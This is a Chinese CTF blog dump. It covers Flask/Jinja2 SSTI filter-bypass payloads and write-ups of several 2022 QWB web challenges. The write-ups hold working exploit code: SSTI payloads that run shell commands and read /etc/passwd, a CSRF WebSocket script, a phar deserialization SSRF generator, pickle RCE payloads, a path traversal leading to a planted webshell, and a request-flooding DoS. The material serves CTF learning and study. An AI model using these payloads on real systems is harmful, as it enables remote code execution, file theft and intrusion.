利用request对象绕过\n1 2 3  {{()[request.args.class][request.args.bases][0][request.args.subclasses]()[40](\u0026#39;/flag\u0026#39;).read()}}\u0026amp;class=__class__\u0026amp;bases=__bases__\u0026amp;subclasses=__subclasses__ {{()[request.args.class][request.args.bases][0][request.args.subclasses]()[77].__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;ls /\u0026#39;).read()}}\u0026amp;class=__class__\u0026amp;bases=__bases__\u0026amp;subclasses=__subclasses__   等同于：\n1  {{().__class__.__bases__[0].__subclasses__().pop(40)(\u0026#39;/etc/passwd\u0026#39;).read()}}{{().__class__.__base__.__subclasses__()[77].__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;ls /\u0026#39;).read()}}   引号' 利用chr()绕过 先获取chr()函数，赋值给chr，后面再拼接成一个字符串\n利用request对象绕过 示例：\n1 2 3 4 5 6 7 8 9  {{().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()}}\u0026amp;path=/etc/passwd {{().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.args.cmd).read()}}\u0026amp;os=os\u0026amp;cmd=ls / 等同于： {{().__class__.__bases__[0].__subclasses__().pop(40)(\u0026#39;/etc/passwd\u0026#39;).read()}} {{().__class__.__base__.__subclasses__()[77].__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;ls /\u0026#39;).read()}}   如果过滤了args，可以将其中的request.args改为request.values，POST和GET两种方法传递的数据request.values都可以接收。\n点. 利用 |attr() 绕过（适用于flask） 如果 . 也被过滤，且目标是JinJa2（flask）的话，可以使用原生JinJa2函数attr()，即：\n1  ().__class__ =\u0026gt; ()|attr(\u0026#34;__class__\u0026#34;)   示例\n1 2 3 4  {{()|attr(\u0026#34;__class__\u0026#34;)|attr(\u0026#34;__base__\u0026#34;)|attr(\u0026#34;__subclasses__\u0026#34;)()|attr(\u0026#34;__getitem__\u0026#34;)(77)|attr(\u0026#34;__init__\u0026#34;)|attr(\u0026#34;__globals__\u0026#34;)|attr(\u0026#34;__getitem__\u0026#34;)(\u0026#34;os\u0026#34;)|attr(\u0026#34;popen\u0026#34;)(\u0026#34;ls /\u0026#34;)|attr(\u0026#34;read\u0026#34;)()}} 等同于 {{().__class__.__base__.__subclasses__()[77].__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;ls /\u0026#39;).read()}}   利用中括号[ ]绕过 如下示例：\n1 2 3 4 5  {{\u0026#39;\u0026#39;[\u0026#39;__class__\u0026#39;][\u0026#39;__bases__\u0026#39;][0][\u0026#39;__subclasses__\u0026#39;]()[59][\u0026#39;__init__\u0026#39;][\u0026#39;__globals__\u0026#39;][\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls\u0026#34;).read()\u0026#39;)}} 等同于： {{().__class__.__bases__.[0].__subclasses__().[59].__init__[\u0026#39;__globals__\u0026#39;][\u0026#39;__builtins__\u0026#39;].eval(\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls /\u0026#34;).read()\u0026#39;)}}   组合绕过 . + [] 1  {{()|attr(\u0026#34;__class__\u0026#34;)|attr(\u0026#34;__base__\u0026#34;)|attr(\u0026#34;__subclasses__\u0026#34;)()|attr(\u0026#34;__getitem__\u0026#34;)(77)|attr(\u0026#34;__init__\u0026#34;)|attr(\u0026#34;__globals__\u0026#34;)|attr(\u0026#34;__getitem__\u0026#34;)(\u0026#34;os\u0026#34;)|attr(\u0026#34;popen\u0026#34;)(\u0026#34;ls\u0026#34;)|attr(\u0026#34;read\u0026#34;)()}}   __ +.+[] 原payload\n1  {{().__class__.__base__.__subclasses__()[77].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls /\u0026#34;).read()\u0026#39;)}}   用 __getitem__()来绕过\n由于还过滤了下划线 __，我们可以用request对象绕过，但是还过滤了中括号 []，所以我们要时绕过 __和 [，就用到了我们的|attr()\n最后\n1  {{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(77)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}\u0026amp;x1=__class__\u0026amp;x2=__base__\u0026amp;x3=__subclasses__\u0026amp;x4=__getitem__\u0026amp;x5=__init__\u0026amp;x6=__globals__\u0026amp;x7=__builtins__\u0026amp;x8=eval\u0026amp;x9=__import__(\u0026#34;os\u0026#34;).popen(\u0026#39;ls /\u0026#39;).read()   \u0026lsquo;+\u0026quot; 1  {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}\u0026amp;path=/etc/passwd   _+'+\u0026quot; 1  {{\u0026#39;\u0026#39;[request.args.class][request.args.mro][2]request.args.subclasses.read() }}\u0026amp;class=_class__\u0026amp;mro=_mro__\u0026amp;subclasses=__subclasses__   _ +. +\u0026rsquo; 1 2 3 4 5 6  {{\u0026#34;\u0026#34;.__class__}} {{\u0026#34;\u0026#34;[\u0026#34;\\\\x5f\\\\x5fclass\\\\x5f\\\\x5f\u0026#34;]}} {{\u0026#34;\u0026#34;[\u0026#34;\\\\x5f\\\\x5fclass\\\\x5f\\\\x5f\u0026#34;][\u0026#34;\\\\x5F\\\\x5Fbases\\\\x5F\\\\x5F\u0026#34;][0][\u0026#34;\\\\x5F\\\\x5Fsubclasses\\\\x5F\\\\x5F\u0026#34;]()[91][\u0026#34;get\\\\x5Fdata\u0026#34;](0, \u0026#34;/flag\u0026#34;)}} #也就是 {{\u0026#34;\u0026#34;.__class__.__bases__[0].__subclasses__()[91].get_data(0,\u0026#34;/flag\u0026#34;)}}   参考文章 https://xz.aliyun.com/t/7746\nhttps://xz.aliyun.com/t/9584\nhttps://www.freebuf.com/articles/network/258136.html\nhttps://hoad-sc.blog.csdn.net/article/details/113778233\nhttps://xz.aliyun.com/t/6885\nhttps://www.freebuf.com/articles/web/264088.html\nhttp://h0cksr.xyz/archives/340\n","date":"2022-09-19T02:09:13+08:00","permalink":"https://example.com/post/ssti/","title":"SSTI_OF_FLASK"},{"content":"rcefile 预期解 原题改的：https://cloud.tencent.com/developer/article/1717668\n首先是www.zip源码泄露\n先看config.inc.php这里有spl_autoload_register()，这个函数是会加载inc文件的\n这里会检测cookie，如果有userfile的话，会进行反序列化\n1 2 3 4 5 6 7 8 9 10 11 12 13  \u0026lt;?php spl_autoload_register(); error_reporting(0); function e($str){ return htmlspecialchars($str); } $userfile = empty($_COOKIE[\u0026#34;userfile\u0026#34;]) ? [] : unserialize($_COOKIE[\u0026#34;userfile\u0026#34;]); ?\u0026gt;\u0026lt;p\u0026gt; \u0026lt;a href=\u0026#34;/index.php\u0026#34;\u0026gt;Index\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;/showfile.php\u0026#34;\u0026gt;files\u0026lt;/a\u0026gt; \u0026lt;/p\u0026gt;   这里有文件上传的功能，我们可以上传一个inc文件里面是一句话木马，这里我们把文件名放进cookie里面构造一个序列化数据即可\n把cookie替换，成功通过spl_autoload_register()包含\n非预期解 直接上传phar文件，发现是可以解析的\nbabyweb 目录扫描到下面结果\n扫到一个buy，测试一下需要post发包，然后需要admin\n看起来是需要拿到admin的权限，然后去这里发包拿flag\n进去里面发现有个修改密码的功能点，还有个报告bug的功能点，这组合起来就是一个csrf的利用了\n这里修改密码是要ws发包过去的，我直接对着题目的js做了一点修改然后放到服务器\n一开始一直没成功，后来发现可能得用内网的地址，刚好题目给了docker部署的命令，所以知道端口是8888\n构造如下的csrf脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  \u0026lt;script\u0026gt; var ws = null; var host = \u0026#34;127.0.0.1:8888\u0026#34; var url = \u0026#34;ws://\u0026#34; + host + \u0026#34;/bot\u0026#34;; ws = new WebSocket(url); ws.onopen = function (event) { console.log(\u0026#39;connection open!\u0026#39;) var msg = \u0026#34;changepw 123\u0026#34;; ws.send(msg); console.log(\u0026#39;changepw\u0026#39;) } ws.onmessage = function (ev) { botsay(ev.data); }; ws.onerror = function () { console.log(\u0026#34;connection error\u0026#34;); }; ws.onclose = function () { console.log(\u0026#34;connection close!\u0026#34;); }; \u0026lt;/script\u0026gt;   修改密码进入后，发现有个购买界面，这里的钱只够购买hint，下载到是源码\napp.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  @app.route(\u0026#34;/buy\u0026#34;, methods=[\u0026#39;POST\u0026#39;]) def buy(): if not session: return redirect(\u0026#39;/login\u0026#39;) elif session[\u0026#39;user\u0026#39;] != \u0026#39;admin\u0026#39;: return \u0026#34;you are not admin\u0026#34; else : result = {} data = request.get_json() product = data[\u0026#34;product\u0026#34;] for i in product: if not isinstance(i[\u0026#34;id\u0026#34;],int) or not isinstance(i[\u0026#34;num\u0026#34;],int): return \u0026#34;not int\u0026#34; if i[\u0026#34;id\u0026#34;] not in (1,2): return \u0026#34;id error\u0026#34; if i[\u0026#34;num\u0026#34;] not in (0,1,2,3,4,5): return \u0026#34;num error\u0026#34; result[i[\u0026#34;id\u0026#34;]] = i[\u0026#34;num\u0026#34;] sql = \u0026#34;select money,flag,hint from qwb where username=\u0026#39;admin\u0026#39;\u0026#34; conn = sqlite3.connect(\u0026#39;/root/py/test.db\u0026#39;) c = conn.cursor() cursor = c.execute(sql) for row in cursor: if len(row): money = row[0] flag = row[1] hint = row[2] data = b\u0026#39;{\u0026#34;secret\u0026#34;:\u0026#34;xxxx\u0026#34;,\u0026#34;money\u0026#34;:\u0026#39; + str(money).encode() + b\u0026#39;,\u0026#39; + request.get_data()[1:] #secret已打码 r = requests.post(\u0026#34;\u0026lt;http://127.0.0.1:10002/pay\u0026gt;\u0026#34;,data).text r = json.loads(r) if r[\u0026#34;error\u0026#34;] != 0: return r[\u0026#34;error\u0026#34;] money = int(r[\u0026#34;money\u0026#34;]) hint = hint + result[1] flag = flag + result[2] sql = \u0026#34;update qwb set money={},hint={},flag={}where username=\u0026#39;admin\u0026#39;\u0026#34;.format(money,hint,flag) conn = sqlite3.connect(\u0026#39;/root/py/test.db\u0026#39;) c = conn.cursor() try: c.execute(sql) conn.commit() except Exception as e: conn.rollback() c.close() conn.close() return \u0026#34;database error\u0026#34; return \u0026#34;success\u0026#34;   pay.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  package main import ( \u0026#34;github.com/buger/jsonparser\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;io\u0026#34; ) func pay(w http.ResponseWriter, r *http.Request) { var cost int64 = 0 var err1 int64 = 0 json, _ := ioutil.ReadAll(r.Body) secret, err := jsonparser.GetString(json, \u0026#34;secret\u0026#34;) if err != nil { fmt.Println(err) } if secret != \u0026#34;xxxx\u0026#34;{ //secret已打码 \tio.WriteString(w, \u0026#34;{\\\\\u0026#34;error\\\\\u0026#34;: \\\\\u0026#34;secret error\\\\\u0026#34;}\u0026#34;) return } money, err := jsonparser.GetInt(json, \u0026#34;money\u0026#34;) if err != nil { fmt.Println(err) } _, err = jsonparser.ArrayEach( json, func(value []byte, dataType jsonparser.ValueType, offset int, err error) { id, _ := jsonparser.GetInt(value, \u0026#34;id\u0026#34;) num, _ := jsonparser.GetInt(value, \u0026#34;num\u0026#34;) if id == 1{ cost = cost + 200 * num }else if id == 2{ cost = cost + 1000 * num }else{ err1 = 1 } }, \u0026#34;product\u0026#34;) if err != nil { fmt.Println(err) } if err1 == 1{ io.WriteString(w, \u0026#34;{\\\\\u0026#34;error\\\\\u0026#34;: \\\\\u0026#34;id error\\\\\u0026#34;}\u0026#34;) return } if cost \u0026gt; money{ io.WriteString(w, \u0026#34;{\\\\\u0026#34;error\\\\\u0026#34;: \\\\\u0026#34;Sorry, your credit is running low!\\\\\u0026#34;}\u0026#34;) return } money = money - cost io.WriteString(w, fmt.Sprintf(\u0026#34;{\\\\\u0026#34;error\\\\\u0026#34;:0,\\\\\u0026#34;money\\\\\u0026#34;: %d}\u0026#34;, money)) } func main() { mux := http.NewServeMux() mux.HandleFunc(\u0026#34;/pay\u0026#34;, pay) http.ListenAndServe(\u0026#34;:10002\u0026#34;, mux) }   一个go和python联合的题目，大概的逻辑是这样\n通俗点讲，python是用来发货的，go是用来付款的，python发货前会通过go来进行付款校验\n所以我们要获取flag，就得让python发货，而go不进行付款\n这里就有两个思路：\n go的整数溢出 python的flask和go的jsonparser对于json同名数据的不同处理  go的整数溢出 这里的cost的定义为int64\n1  var cost int64 = 0   最后生成cost的时候，我们传入num，然后计算cost去进行判断\n1 2 3 4 5 6 7  if id == 1{ cost = cost + 200 * num }else if id == 2{ cost = cost + 1000 * num }else{ err1 = 1 }   这里我们num传入很大的值，就会溢出，导致cost会小于money，这样就成功过了go\njson处理不同 这里我搭建了一个本地的环境\n1 2 3 4 5 6 7 8 9 10 11  from flask import request,Flask app = Flask(__name__) @app.route(\u0026#34;/buy\u0026#34;, methods=[\u0026#39;POST\u0026#39;]) def buy(): data = request.get_json() product = data[\u0026#34;product\u0026#34;] return str(product) if __name__ == \u0026#34;__main__\u0026#34;: app.run(debug=\u0026#34;on\u0026#34;,port=10000)   可以看到，如果出现了同一个键的json数据，flask里面的get_json会取最后的\n再看go的jsonparser\n1 2 3 4 5 6 7 8  package main import \u0026#34;github.com/buger/jsonparser\u0026#34; data := []byte(`{\u0026#34;id\u0026#34;:1,\u0026#34;id\u0026#34;:2}`) id := jsonparser.GetString(data, \u0026#34;id\u0026#34;) print(id)   这里却是取的前者\n所以这里他们解析json的方式会不一样，那么我们传入这样的参数\n1  {\u0026#34;product\u0026#34;:[{\u0026#34;id\u0026#34;:1,\u0026#34;num\u0026#34;:0},{\u0026#34;id\u0026#34;:2,\u0026#34;num\u0026#34;:0}],\u0026#34;product\u0026#34;:[{\u0026#34;id\u0026#34;:1,\u0026#34;num\u0026#34;:0},{\u0026#34;id\u0026#34;:2,\u0026#34;num\u0026#34;:1}]}   这里python收到以后，会取后者，也就是flag的num为1，而go会取前者，也就是flag的num为0\n这个意思就是，python会发货，但是go并不会花钱，达到购买的效果\neasyweb 首先是一个文件读取的漏洞，但是要求读取的文件里面必须有demo或者host\n那么我们就可以这样做\n1  /showfile.php?f=./demo/../index.php   读取到下面的文件\nindex.php\n1 2 3 4 5 6 7  \u0026lt;?php $upload = md5(\u0026#34;2022qwb\u0026#34;.$_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); @mkdir($upload, 0333, true); if(isset($_POST[\u0026#39;submit\u0026#39;])) { include \u0026#39;upload.php\u0026#39;; } ?\u0026gt;  upload.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  \u0026lt;?php error_reporting(0); require_once(\u0026#39;class.php\u0026#39;); if(isset($_SESSION)){ if(isset($_GET[\u0026#39;fname\u0026#39;])?!empty($_GET[\u0026#39;fname\u0026#39;]):FALSE){ $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;] = $_GET[\u0026#39;fname\u0026#39;]; } $upload = new Upload(); $upload-\u0026gt;upload(); }else { die(\u0026#34;\u0026lt;p class=\u0026#39;tip\u0026#39;\u0026gt;guest can not upload file\u0026lt;/p\u0026gt;\u0026#34;); } ?\u0026gt;  class.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120  \u0026lt;?php class Upload { public $file; public $filesize; public $date; public $tmp; function __construct(){ $this-\u0026gt;file = $_FILES[\u0026#34;file\u0026#34;]; } function do_upload() { $filename = session_id().explode(\u0026#34;.\u0026#34;,$this-\u0026gt;file[\u0026#34;name\u0026#34;])[0].\u0026#34;.jpg\u0026#34;; if(file_exists($filename)) { unlink($filename); } move_uploaded_file($this-\u0026gt;file[\u0026#34;tmp_name\u0026#34;],md5(\u0026#34;2022qwb\u0026#34;.$_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]).\u0026#34;/\u0026#34;.$filename); echo \u0026#39;upload \u0026#39;.\u0026#34;./\u0026#34;.md5(\u0026#34;2022qwb\u0026#34;.$_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]).\u0026#34;/\u0026#34;.$this-\u0026gt;e($filename).\u0026#39; success!\u0026#39;; } function e($str){ return htmlspecialchars($str); } function upload() { if($this-\u0026gt;check()) { $this-\u0026gt;do_upload(); } } function __toString(){ return $this-\u0026gt;file[\u0026#34;name\u0026#34;]; } function __get($value){ $this-\u0026gt;filesize-\u0026gt;$value = $this-\u0026gt;date; echo $this-\u0026gt;tmp; } function check() { $allowed_types = array(\u0026#34;jpg\u0026#34;,\u0026#34;png\u0026#34;,\u0026#34;jpeg\u0026#34;); $temp = explode(\u0026#34;.\u0026#34;,$this-\u0026gt;file[\u0026#34;name\u0026#34;]); $extension = end($temp); if(in_array($extension,$allowed_types)) { return true; } else { echo \u0026#39;Invalid file!\u0026#39;; return false; } } } class GuestShow{ public $file; public $contents; public function __construct($file) { $this-\u0026gt;file=$file; } function __toString(){ $str = $this-\u0026gt;file-\u0026gt;name; return \u0026#34;\u0026#34;; } function __get($value){ return $this-\u0026gt;$value; } function show() { $this-\u0026gt;contents = file_get_contents($this-\u0026gt;file); $src = \u0026#34;data:jpg;base64,\u0026#34;.base64_encode($this-\u0026gt;contents); echo \u0026#34;\u0026lt;img src={$src}/\u0026gt;\u0026#34;; } function __destruct(){ echo $this; } } class AdminShow{ public $source; public $str; public $filter; public function __construct($file) { $this-\u0026gt;source = $file; $this-\u0026gt;schema = \u0026#39;file:///var/www/html/\u0026#39;; } public function __toString() { $content = $this-\u0026gt;str[0]-\u0026gt;source; $content = $this-\u0026gt;str[1]-\u0026gt;schema; return $content; } public function __get($value){ $this-\u0026gt;show(); return $this-\u0026gt;$value; } public function __set($key,$value){ $this-\u0026gt;$key = $value; } public function show(){ if(preg_match(\u0026#39;/usr|auto|log/i\u0026#39; , $this-\u0026gt;source)) { die(\u0026#34;error\u0026#34;); } $url = $this-\u0026gt;schema . $this-\u0026gt;source; $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_HEADER, 1); $response = curl_exec($curl); curl_close($curl); $src = \u0026#34;data:jpg;base64,\u0026#34;.base64_encode($response); echo \u0026#34;\u0026lt;img src={$src}/\u0026gt;\u0026#34;; } public function __wakeup() { if ($this-\u0026gt;schema !== \u0026#39;file:///var/www/html/\u0026#39;) { $this-\u0026gt;schema = \u0026#39;file:///var/www/html/\u0026#39;; } if ($this-\u0026gt;source !== \u0026#39;admin.png\u0026#39;) { $this-\u0026gt;source = \u0026#39;admin.png\u0026#39;; } } }   class.php里面，AdminShow类里面有wakeup方法，这里导致无法修改schema和source\n这里需要绕过AdminShow的wakeup\n再看利用方面，这里的show，是有个file_get_contents的，所以我们这里可以触发一个phar\n然后看，这里upload必须有个$_SESSION，所以我们上传可以添加一个sessionupload\n1 2 3 4 5 6 7 8 9 10  \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;\u0026lt;http://47.104.95.124:8080/index.php\u0026gt;\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34; value=\u0026#34;提交\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;PHP_SESSION_UPLOAD_PROGRESS\u0026#34; value=\u0026#34;123\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   这样让他上传\n而在AdminShow的show方法里面，有ssrf能打\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  public function show(){ if(preg_match(\u0026#39;/usr|auto|log/i\u0026#39; , $this-\u0026gt;source)) { die(\u0026#34;error\u0026#34;); } $url = $this-\u0026gt;schema . $this-\u0026gt;source; $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_HEADER, 1); $response = curl_exec($curl); curl_close($curl); $src = \u0026#34;data:jpg;base64,\u0026#34;.base64_encode($response); echo \u0026#34;\u0026lt;img src={$src} /\u0026gt;\u0026#34;; }   而这里进adminshow的show方法在__get里面\n而这里url居然是用了一个拼接，感觉多此一举，这里完全可以一个参数完成的，但是这里画蛇添足的去多加了一个参数去进行拼接，而且schema还没有在class里面定义，也就是说这个参数可以消失掉\n1  $url = $this-\u0026gt;schema . $this-\u0026gt;source;   这里可以看类的构造方法这一块，这里的schema只是在construct里面写死了，所以我们直接舍弃掉schema，就单独用source\n1 2 3 4 5 6 7 8 9  class AdminShow{ public $source; public $str; public $filter; public function __construct($file) { $this-\u0026gt;source = $file; $this-\u0026gt;schema = \u0026#39;file:///var/www/html/\u0026#39;; }   这样wakeup这里的：$this*-\u0026gt;schema 就会找不到schema，从而触发到adminshow的get，进而进入到show方法\n1 2 3 4 5 6 7 8 9  public function __wakeup() { if ($this-\u0026gt;schema !== \u0026#39;file:///var/www/html/\u0026#39;) { $this-\u0026gt;schema = \u0026#39;file:///var/www/html/\u0026#39;; } if ($this-\u0026gt;source !== \u0026#39;admin.png\u0026#39;) { $this-\u0026gt;source = \u0026#39;admin.png\u0026#39;; } }   这样就可以达成利用了\n读/proc/net/arp\n1 2 3 4 5 6 7 8 9 10 11 12 13  IP address HW type Flags HW address Mask Device 10.10.10.11 0x1 0x0 00:00:00:00:00:00 * eth1 10.10.10.4 0x1 0x0 00:00:00:00:00:00 * eth1 10.10.10.10 0x1 0x2 02:42:0a:0a:0a:0a * eth1 10.10.10.1 0x1 0x2 02:42:2c:32:74:76 * eth1 10.10.10.7 0x1 0x0 00:00:00:00:00:00 * eth1 10.10.10.6 0x1 0x0 00:00:00:00:00:00 * eth1 10.10.10.12 0x1 0x0 00:00:00:00:00:00 * eth1 10.10.10.3 0x1 0x0 00:00:00:00:00:00 * eth1 10.10.10.9 0x1 0x0 00:00:00:00:00:00 * eth1 172.18.0.1 0x1 0x2 02:42:60:b2:90:eb * eth0 10.10.10.2 0x1 0x0 00:00:00:00:00:00 * eth1 10.10.10.8 0x1 0x0 00:00:00:00:00:00 * eth1   这几个内网手动测下去，在10.10.10.10发现有内容\n生成phar文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  \u0026lt;?php class AdminShow{ public $source; public $str; public $filter; public function __construct($file) { $this-\u0026gt;source = $file; } } @unlink(\u0026#34;phar.phar\u0026#34;); $phar = new Phar(\u0026#34;phar.phar\u0026#34;); //后缀名必须为phar $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //设置stub $o = new AdminShow(\u0026#34;http://10.10.10.10\u0026#34;); $phar-\u0026gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-\u0026gt;addFromString(\u0026#34;demo.jpg\u0026#34;, \u0026#34;test\u0026#34;); //添加要压缩的文件 //签名自动计算 $phar-\u0026gt;stopBuffering();   然后触发phar\n有内网能打\n最后的exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  \u0026lt;?php class AdminShow{ public $source; public $str; public $filter; public function __construct($file) { $this-\u0026gt;source = $file; } } @unlink(\u0026#34;phar.phar\u0026#34;); $phar = new Phar(\u0026#34;phar.phar\u0026#34;); //后缀名必须为phar $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //设置stub $o = new AdminShow(\u0026#34;http://10.10.10.10/?url=file:///flag\u0026#34;); $phar-\u0026gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-\u0026gt;addFromString(\u0026#34;demo.jpg\u0026#34;, \u0026#34;test\u0026#34;); //添加要压缩的文件 //签名自动计算 $phar-\u0026gt;stopBuffering();   crash 题目说504可以拿到flag，504是Gateway Timeout\n给了源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55  import base64 # import sqlite3 import pickle from flask import Flask, make_response,request, session import admin import random app = Flask(__name__,static_url_path=\u0026#39;\u0026#39;) app.secret_key=random.randbytes(12) class User: def __init__(self, username,password): self.username=username self.token=hash(password) def get_password(username): if username==\u0026#34;admin\u0026#34;: return admin.secret else: # conn=sqlite3.connect(\u0026#34;user.db\u0026#34;) # cursor=conn.cursor() # cursor.execute(f\u0026#34;select password from usertable where username=\u0026#39;{username}\u0026#39;\u0026#34;) # data=cursor.fetchall()[0] # if data: # return data[0]  # else: # return None return session.get(\u0026#34;password\u0026#34;) @app.route(\u0026#39;/balancer\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def flag(): pickle_data=base64.b64decode(request.cookies.get(\u0026#34;userdata\u0026#34;)) if b\u0026#39;R\u0026#39; in pickle_data or b\u0026#34;secret\u0026#34; in pickle_data: return \u0026#34;You damm hacker!\u0026#34; os.system(\u0026#34;rm -rf *py*\u0026#34;) userdata=pickle.loads(pickle_data) if userdata.token!=hash(get_password(userdata.username)): return \u0026#34;Login First\u0026#34; if userdata.username==\u0026#39;admin\u0026#39;: return \u0026#34;Welcome admin, here is your next challenge!\u0026#34; return \u0026#34;You\u0026#39;re not admin!\u0026#34; @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): resp = make_response(\u0026#34;success\u0026#34;) session[\u0026#34;password\u0026#34;]=request.values.get(\u0026#34;password\u0026#34;) resp.set_cookie(\u0026#34;userdata\u0026#34;, base64.b64encode(pickle.dumps(User(request.values.get(\u0026#34;username\u0026#34;),request.values.get(\u0026#34;password\u0026#34;)),2)), max_age=3600) return resp @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def index(): return open(\u0026#39;source.txt\u0026#39;,\u0026#34;r\u0026#34;).read() if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000)   login路由创建session和userdata\n这里balancer路由检测到pickle数据里没有R和secret后就会解pickle，所以这里是可以直接rce的，只要绕R就行了，比如这里的i\n1 2 3 4  (S\u0026#39;whoami\u0026#39; ios system .   非预期 题目只要求构造504就有flag，那么就不一定得按题目走下去，所以我这里应该是非预期了，我让这个会话sleep一段时间，多发几个包，服务器就会受不了了\n预期 预期就是走题目的逻辑，他会判断secret是否匹配，但是这里是secret是未知的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  if userdata.token!=hash(get_password(userdata.username)): return \u0026#34;Login First\u0026#34; if userdata.username==\u0026#39;admin\u0026#39;: return \u0026#34;Welcome admin, here is your next challenge!\u0026#34; def get_password(username): if username==\u0026#34;admin\u0026#34;: return admin.secret else: # conn=sqlite3.connect(\u0026#34;user.db\u0026#34;) # cursor=conn.cursor() # cursor.execute(f\u0026#34;select password from usertable where username=\u0026#39;{username}\u0026#39;\u0026#34;) # data=cursor.fetchall()[0] # if data: # return data[0] # else: # return None return session.get(\u0026#34;password\u0026#34;)   这题有点像：高校战疫网络安全分享赛:webtmp，做法就是覆盖掉secret绕过验证，只不过这里对secret关键词进行了过滤，解决办法是unicode编码\n这里看到nu1l的wp，发现可以直接hex绕，也是可以的\n1 2 3 4 5  b\u0026#39;\u0026#39;\u0026#39;capp admin (S\u0026#39;\\\\x73ecret\u0026#39; S\u0026#39;1\u0026#39; db.\u0026#39;\u0026#39;\u0026#39;   进去就可以修改负载均衡的配置了\nWP-UM 一进去就是一个安装\n账号密码放在根目录下了，这就很刻意的让我们去目录遍历去找账号密码了\n他提到了危险出插件，题目给了源码，我们直接进去看看装了什么插件\n这个user-meta搜了一下，确实存在一个目录遍历的漏洞，看一下版本正好对上，是CVE-2022-0779\nhttps://skynettools.com/wordpress-user-meta-lite-and-pro-2-4-3-vulnerable-to-path-traversal-exploit/\n成功探测到\n这样探测出用户名密码：MaoGePaMao:MaoGeYaoQiFeiLa\n进到后台，在外观编辑处可以直接编辑php代码，直接写php木马\n进蚁剑翻了很久很久翻到了flag。。。\neasylogin wordpress这个版本存在sql注入，这里进行报错注入测试\nhttps://www.freebuf.com/articles/web/321297.html\n报错注入成功\n直接sqlmap嗦\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  --- web server operating system: Linux 